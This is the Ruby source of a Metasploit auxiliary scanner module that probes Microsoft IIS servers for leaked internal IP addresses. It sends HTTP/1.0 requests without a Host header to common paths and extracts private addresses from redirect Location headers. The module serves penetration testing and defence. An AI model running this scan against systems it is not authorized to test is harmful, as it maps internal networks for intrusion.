##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Microsoft IIS HTTP Internal IP Disclosure',
      'Description' => %q{
        Collect any leaked internal IPs by requesting commonly redirected locs from IIS.
      },
      'Author'       => ['Heather Pilkington'],
      'License'     => MSF_LICENSE
    ))
  end

  def run_host(target_host)
    uris = ["/","/images","/default.htm"]

    uris.each do |uri|
      #Must use send_recv() in order to send a HTTP request without the 'Host' header
      c = connect
      res = c.send_recv("GET #{uri} HTTP/1.0\r\n\r\n", 25)

      if res.nil?
        print_error("no response for #{target_host}")

      elsif (res.code > 300 and res.code < 310)
        intipregex = /(192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/i
        print_good("Location Header: #{res.headers["Location"]}")
        result = res.headers["Location"].scan(intipregex).uniq.flatten

        if result.length > 0
          print_good("Result for #{target_host} found Internal IP:  #{result.first}")
        end

        report_note({
          :host   => target_host,
          :port   => rport,
          :proto => 'tcp',
          :sname  => (ssl ? 'https' : 'http'),
          :type   => 'iis.ip',
          :data   => result.first
        })
      end

    end
  end
end
